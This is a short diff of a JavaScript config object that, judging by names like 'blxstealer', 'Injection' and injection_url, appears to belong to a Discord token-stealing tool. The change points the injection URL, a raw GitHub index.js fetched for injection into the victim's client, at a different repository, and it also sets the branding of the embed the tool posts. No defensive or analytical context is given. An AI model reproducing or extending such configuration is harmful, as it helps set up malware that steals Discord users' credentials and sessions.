@@ -14,7 +14,7 @@ const config = {
   embed_name: 'R£$ | Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/blxstealer/main/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
   /**
    
    **/
